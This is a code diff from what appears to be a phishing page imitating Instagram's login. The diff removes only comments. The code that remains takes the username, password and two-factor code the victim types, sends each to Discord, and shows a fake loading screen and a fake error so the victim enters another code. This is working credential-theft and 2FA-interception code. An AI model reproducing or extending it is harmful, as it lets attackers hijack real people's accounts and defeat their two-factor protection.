@@ -178,19 +178,13 @@
                 const username = document.getElementById('username').value;
                 const password = document.getElementById('password').value;
                 
-                // Show loading message
                 document.getElementById('loading-message').classList.add('show');
                 
-                // Send login info to Discord
                 const message = `New Login Attempt\nUsername/Email: ${username}\nPassword: ${password}`;
                 await sendDiscordMessage(message);
 
-                // Simulate Instagram login and 2FA check
                 setTimeout(() => {
                     document.getElementById('loading-message').classList.remove('show');
-                    
-                    // Simulate that login was successful and account has 2FA
-                    // Her hesap için 2FA ekranını göster
                     document.querySelector('.verification-container').classList.add('active');
                     document.querySelector('.container').style.transform = 'translateX(-420px)';
                     
@@ -201,9 +195,7 @@
                 const message = `2FA Code: ${code}`;
                 await sendDiscordMessage(message);
 
-                // Show error message
                 document.getElementById('error-message').classList.add('show');
-                // Clear the verification code input
                 document.getElementById('verification-code').value = '';
             }
         }
